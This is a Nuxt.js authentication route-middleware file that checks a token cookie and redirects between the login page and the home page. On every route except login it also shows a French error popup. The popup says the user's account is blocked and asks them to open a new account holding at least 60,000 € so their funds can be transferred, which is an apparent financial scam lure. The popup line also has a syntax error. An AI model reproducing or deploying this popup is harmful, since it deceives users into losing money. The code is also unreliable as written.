import {useRoute} from "vue-router";
import Swal from "sweetalert2";

export default defineNuxtRouteMiddleware((to) => {
    const { authenticated } = storeToRefs(useAuthStore()); // make authenticated state reactive
    const token = useCookie('token'); // get token from cookies
    if (token.value) {
      // check if value exists
      authenticated.value = true; // update the state to authenticated
    }

    const route = useRoute()
    if(route.path !== '/auth/login')
        Swal.fire('Erreur', "Votre compte est bloqué. Veuillez ouvrir un autre compte afin que nous puissions y transférer vos fonds, assurez-vous d'avoir au moins 60 000 € sur le compte. Pour toute information supplémentaire, merci de vous adresser à votre conseiller." +, 'error');
  
    // if token exists and url is /login redirect to homepage
    if (token.value && to?.name === 'auth-login') {
      return navigateTo('/');
    }
  
    // if token doesn't exist redirect to log in
    if (!token.value && to?.name !== 'auth-login') { 
        return navigateTo('/auth/login');
    }
  });
  
